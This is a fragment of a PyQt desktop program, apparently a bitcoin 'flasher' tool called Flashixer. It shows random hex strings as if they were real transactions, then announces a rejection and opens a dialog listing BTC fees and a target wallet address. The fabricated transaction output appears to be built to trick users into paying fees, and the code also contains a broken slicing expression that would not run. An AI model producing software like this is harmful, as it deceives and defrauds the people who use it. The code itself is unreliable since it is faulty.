    @pyqtSlot(str)
    def delay_print(self, text, color: str='yellow'):
        for character in text:
            if color:
                css = self.cssTextBrowser.replace(f"{color}", "#52ff52")
            else:
                css = self.cssTextBrowser.replace("yellow", "#52ff52")
            self.TextBrowser.moveCursor(QTextCursor.End)
            self.TextBrowser.setStyleSheet(css)
            self.TextBrowser.insertPlainText(character)
            self.TextBrowser.ensureCursorVisible()
            QApplication.processEvents()
            time.sleep(0.01)

    @pyqtSlot(str)
    def PrintTxs(self, text, color: str='white'):
        for character in text:
            if color:
                css = self.cssTextBrowser.replace(f"{color}", "#52ff52")
            else:
                css = self.cssTextBrowser.replace("white", "#52ff52")
            self.TextBrowser.moveCursor(QTextCursor.End)
            self.TextBrowser.setStyleSheet(css)
            self.TextBrowser.insertPlainText(character)
            self.TextBrowser.ensureCursorVisible()
            QApplication.processEvents()
            time.sleep(0.01)

    def OnCreator_Update(self):
        osx = os.urandom(32).hex()
        self.PrintTxs(f"\n[ADDED][TX: {self.z}] TXS: {osx[0[:42]].upper()}....")
        self.z += 1
        if not self.scan:
            self.timer.stop()
        else:
            if int(self.z) >= self.TotalTxs:
                self.scan = False
                self.timer.stop()
                self.z = 0
                textMsg = "\n\n[+] Rejected Detected...\n"
                self.PrintTxs(textMsg)
                self.OnSetDetail()

    def OnSetDetail(self):
        self.OnErrorBal(totalTxs=(self.TotalTxs), feePerTxs=(self.FeePerTxs), totalFee=(self.TotalFee), targetAddr=(self.toAddr))

    def OnErrorBal(self, totalTxs, feePerTxs, totalFee, targetAddr):
        """ self.OnErrorBal(totalTxs, feePerTxs, totalFee, targetAddr) """
        self.ErrorBal.Line_TotalTxs.setText(f"{totalTxs}")
        self.ErrorBal.Line_TotalFee.setText(f"{totalFee} BTC")
        self.ErrorBal.Line_FeePerTxs.setText(f"{feePerTxs} BTC")
        self.ErrorBal.Line_Wallet_P2PKH.setText(f"{targetAddr}")
        bal = self.Balance
        self.ErrorBal.Line_Balance.setText(f"{bal} BTC")
        self.ErrorBal.show()

    def OnOpen_Website(self):
        webbrowser.open_new(URL_WEB)

    def OnOpen_HomePage(self):
        webbrowser.open_new(HomePage_Flashixer)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    uiMain = Ui_MainWindow()
    uiMain.show()
    sys.exit(app.exec_())
